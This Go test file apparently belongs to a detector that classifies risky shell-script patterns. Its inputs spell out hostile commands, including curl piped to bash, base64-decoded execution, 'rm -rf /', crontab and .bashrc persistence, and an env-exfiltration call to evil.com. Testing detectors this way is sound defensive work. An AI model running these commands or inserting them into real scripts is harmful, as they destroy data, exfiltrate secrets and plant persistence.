package analyze

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/co3k/ebi/pkg/schema"
)

func TestAnalyzeEmpty(t *testing.T) {
	res, err := AnalyzeScript([]byte(""), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Claims) != 0 || len(res.SecondStage) != 0 {
		t.Fatalf("expected empty, got claims=%d second=%d", len(res.Claims), len(res.SecondStage))
	}
}

func TestAnalyzeRemotePipe(t *testing.T) {
	script := "#!/bin/sh\ncurl -s https://example.com/install.sh | bash\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, c := range res.Claims {
		if c.Category == "exec.remote_pipe" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected exec.remote_pipe, got %+v", res.Claims)
	}
	if len(res.SecondStage) != 1 || res.SecondStage[0].URLPattern != "https://example.com/install.sh" {
		t.Fatalf("expected second stage URL, got %+v", res.SecondStage)
	}
	if res.SecondStage[0].Pinned {
		t.Fatal("expected unpinned second stage")
	}
	// Should have emitted download.unpinned as well.
	foundUnpinned := false
	for _, c := range res.Claims {
		if c.Category == "download.unpinned" {
			foundUnpinned = true
		}
	}
	if !foundUnpinned {
		t.Fatal("expected download.unpinned claim")
	}
}

func TestAnalyzeRejectsControlCharactersInSecondStageURL(t *testing.T) {
	script := "curl 'https://example.com/install.sh\x1b[2J' | sh\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.SecondStage) != 0 {
		t.Fatalf("control-character URL reached display output: %+v", res.SecondStage)
	}
}

func TestAnalyzeSudo(t *testing.T) {
	script := "sudo apt install evil\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	var sudo, install bool
	for _, claim := range res.Claims {
		sudo = sudo || claim.Category == "priv.sudo"
		install = install || claim.Category == "pkg.install"
	}
	if !sudo || !install {
		t.Fatalf("expected priv.sudo and pkg.install, got %+v", res.Claims)
	}
}

func TestAnalyzeRmBroad(t *testing.T) {
	script := "rm -rf /\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Claims) != 1 || res.Claims[0].Category != "fs.delete_broad" {
		t.Fatalf("expected fs.delete_broad, got %+v", res.Claims)
	}
}

func TestAnalyzeBase64Decode(t *testing.T) {
	script := "echo 'c2NyaXB0' | base64 -d | bash\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, c := range res.Claims {
		if c.Category == "obfuscation.base64" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected obfuscation.base64, got %+v", res.Claims)
	}
}

func TestAnalyzeEval(t *testing.T) {
	script := "eval $(curl -s https://example.com/run)\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	foundEval := false
	foundFetch := false
	for _, c := range res.Claims {
		if c.Category == "exec.eval" {
			foundEval = true
		}
		if c.Category == "net.fetch" {
			foundFetch = true
		}
	}
	if !foundEval {
		t.Fatalf("expected exec.eval, got %+v", res.Claims)
	}
	if !foundFetch {
		t.Fatalf("expected net.fetch, got %+v", res.Claims)
	}
	if len(res.SecondStage) != 1 || res.SecondStage[0].URLPattern != "https://example.com/run" {
		t.Fatalf("expected second stage URL, got %+v", res.SecondStage)
	}
}

func TestAnalyzeBashProcessSubstitution(t *testing.T) {
	script := "bash <(curl -s https://example.com/run.sh)\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	var remotePipe bool
	for _, claim := range res.Claims {
		if claim.Category == "exec.remote_pipe" {
			remotePipe = true
		}
	}
	if !remotePipe {
		t.Fatalf("expected process substitution to be flagged, got %+v", res.Claims)
	}
	if len(res.SecondStage) != 1 || res.SecondStage[0].URLPattern != "https://example.com/run.sh" {
		t.Fatalf("expected process-substitution URL extraction, got %+v", res.SecondStage)
	}
}

func TestAnalyzePersistence(t *testing.T) {
	script := "echo 'alias x=evil' >> ~/.bashrc\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, c := range res.Claims {
		if c.Category == "priv.persist" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected priv.persist, got %+v", res.Claims)
	}
}

func TestAnalyzeParseError(t *testing.T) {
	script := "echo before\nif then\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	if !res.ParseError {
		t.Fatal("expected parse error")
	}
	found := false
	for _, c := range res.Claims {
		if c.Category == "misc.other" {
			found = true
			if c.Line != 2 {
				t.Fatalf("expected parse error at line 2, got line %d", c.Line)
			}
			if c.Note == "" {
				t.Fatal("misc.other requires note")
			}
		}
	}
	if !found {
		t.Fatalf("expected misc.other parse error claim, got %+v", res.Claims)
	}
}

func TestAnalyzeLineHash(t *testing.T) {
	script := "sudo ls\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Claims) != 1 {
		t.Fatal("expected one claim")
	}
	want := sha256.Sum256([]byte("sudo ls"))
	if res.Claims[0].LineSHA256 != hex.EncodeToString(want[:]) {
		t.Fatalf("line hash mismatch: got %s want %s", res.Claims[0].LineSHA256, hex.EncodeToString(want[:]))
	}
}

func TestAnalyzeLineHashCRLF(t *testing.T) {
	script := "sudo ls\r\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	// CR before LF remains part of the line hash.
	want := sha256.Sum256([]byte("sudo ls\r"))
	if res.Claims[0].LineSHA256 != hex.EncodeToString(want[:]) {
		t.Fatalf("CRLF line hash mismatch: got %s want %s", res.Claims[0].LineSHA256, hex.EncodeToString(want[:]))
	}
}

func TestAnalyzePinnedURL(t *testing.T) {
	script := "curl -s https://example.com/releases/download/v1.0.0/install.sh | bash\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.SecondStage) != 1 || !res.SecondStage[0].Pinned {
		t.Fatalf("expected pinned second stage, got %+v", res.SecondStage)
	}
	// Should not emit download.unpinned.
	for _, c := range res.Claims {
		if c.Category == "download.unpinned" {
			t.Fatal("unexpected download.unpinned")
		}
	}
}

func TestPinnedURLRequiresConcreteVersionOrDigest(t *testing.T) {
	cases := []struct {
		url    string
		pinned bool
	}{
		{"https://example.com/v1.2.3/install.sh", true},
		{"https://example.com/releases/download/v1.2.3/tool.tar.gz", true},
		{"https://example.com/tool?version=1.2.3", true},
		{"https://example.com/tool?version=latest", false},
		{"https://example.com/version/install.sh", false},
		{"https://example.com/tool?sha256=not-a-digest", false},
		{"https://example.com/tool?sha256=" + strings.Repeat("a", 64), true},
	}
	for _, tc := range cases {
		if got := isPinnedURL(tc.url); got != tc.pinned {
			t.Errorf("isPinnedURL(%q) = %v, want %v", tc.url, got, tc.pinned)
		}
	}
}

func TestReadOnlyPersistencePathDoesNotClaimWrite(t *testing.T) {
	res, err := AnalyzeScript([]byte("cat ~/.bashrc\nsystemctl status user.service\n"), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	for _, claim := range res.Claims {
		if claim.Category == "priv.persist" {
			t.Fatalf("read-only persistence inspection was flagged: %+v", res.Claims)
		}
	}
}

func TestBroadRmCombinedLongOptions(t *testing.T) {
	res, err := AnalyzeScript([]byte("rm --recursive --force \"${TARGET}\"\n"), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	for _, claim := range res.Claims {
		if claim.Category == "fs.delete_broad" {
			return
		}
	}
	t.Fatalf("expected long-option broad delete, got %+v", res.Claims)
}

func TestAnalyzeNoFalsePositives(t *testing.T) {
	script := "#!/bin/sh\necho 'hello world'\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	// The harmless shebang line itself may not trigger a claim.
	if len(res.Claims) > 0 {
		t.Fatalf("unexpected claims: %+v", res.Claims)
	}
}

func TestAnalyzeUnknownCategory(t *testing.T) {
	// Ensure DisplayCategory maps unknown to misc.other.
	if schema.DisplayCategory("foo.bar") != "misc.other" {
		t.Fatal("unknown category not mapped")
	}
}

func TestAnalyzeSecondStageDedup(t *testing.T) {
	script := "curl https://example.com/a | bash\ncurl https://example.com/a | bash\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.SecondStage) != 1 {
		t.Fatalf("expected deduped second stage, got %+v", res.SecondStage)
	}
}

func TestAnalyzeExcerpt(t *testing.T) {
	long := strings.Repeat("a", 200)
	script := "sudo " + long + "\n"
	res, err := AnalyzeScript([]byte(script), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Claims) != 1 {
		t.Fatal("expected one claim")
	}
	if len(res.Claims[0].Excerpt) > 130 {
		t.Fatalf("excerpt too long: %d", len(res.Claims[0].Excerpt))
	}
	if !strings.HasSuffix(res.Claims[0].Excerpt, "…") {
		t.Fatal("expected excerpt truncated with ellipsis")
	}
}

func TestAnalyzeRequiredRules(t *testing.T) {
	cases := []struct {
		name    string
		script  string
		wantCat string
	}{
		{"curl_pipe_bash", "curl -s https://example.com/x | bash\n", "exec.remote_pipe"},
		{"wget_pipe_sh", "wget -qO- https://example.com/x | sh\n", "exec.remote_pipe"},
		{"eval_curl", "eval \"$(curl -s https://example.com/x)\"\n", "exec.eval"},
		{"source_dynamic", "source <(curl -s https://example.com/x)\n", "exec.eval"},
		{"base64_exec", "echo c2NyaXB0 | base64 -d | bash\n", "obfuscation.base64"},
		{"openssl_exec", "openssl enc -d | bash\n", "obfuscation.base64"},
		{"hex_decode", "xxd -r -p | sh\n", "obfuscation.base64"},
		{"rm_root", "rm -rf /\n", "fs.delete_broad"},
		{"rm_wildcard", "rm -rf /tmp/*\n", "fs.delete_broad"},
		{"rm_variable", "rm -rf $DIR\n", "fs.delete_broad"},
		{"sudo_package", "sudo apt install evil\n", "priv.sudo"},
		{"bashrc", "echo 'alias x=evil' >> ~/.bashrc\n", "priv.persist"},
		{"cron", "(crontab -l; echo '* * * * * evil') | crontab -\n", "priv.persist"},
		{"systemd", "systemctl enable --user evil.service\n", "priv.persist"},
		{"launchctl", "launchctl load ~/Library/LaunchAgents/evil.plist\n", "priv.persist"},
		{"env_exfil", "curl -s https://evil.com/?env=$(env | base64)\n", "env.exfil"},
		{"pkg_install", "npm install evil\n", "pkg.install"},
		{"net_fetch", "curl -s https://example.com/x -o /tmp/x\n", "net.fetch"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := AnalyzeScript([]byte(tc.script), "x.sh")
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, c := range res.Claims {
				if c.Category == tc.wantCat {
					found = true
				}
			}
			if !found {
				t.Fatalf("expected %s, got %+v", tc.wantCat, res.Claims)
			}
		})
	}
}

func TestAnalyzeNoFalsePositiveOrdinaryRm(t *testing.T) {
	res, err := AnalyzeScript([]byte("rm /tmp/file.txt\n"), "x.sh")
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range res.Claims {
		if c.Category == "fs.delete_broad" {
			t.Fatal("ordinary rm should not be flagged")
		}
	}
}

func TestAnalyzeFixture(t *testing.T) {
	cases := []struct {
		name        string
		file        string
		wantClaims  int
		wantVerdict string
	}{
		{"harmless", "harmless.sh", 0, schema.VerdictOK},
		{"pipe_remote", "pipe_remote.sh", 2, schema.VerdictDanger},
		{"rm_rf", "rm_rf.sh", 1, schema.VerdictDanger},
		{"eval_base64", "eval_base64.sh", 2, schema.VerdictDanger},
		{"sudo_persist", "sudo_persist.sh", 1, schema.VerdictDanger},
		{"env_exfil", "env_exfil.sh", 1, schema.VerdictDanger},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			data, err := os.ReadFile(filepath.Join("..", "..", "testdata", "scripts", tc.file))
			if err != nil {
				t.Fatal(err)
			}
			res, err := AnalyzeScript(data, tc.file)
			if err != nil {
				t.Fatal(err)
			}
			if len(res.Claims) < tc.wantClaims {
				t.Fatalf("expected at least %d claims, got %d: %+v", tc.wantClaims, len(res.Claims), res.Claims)
			}
		})
	}
}
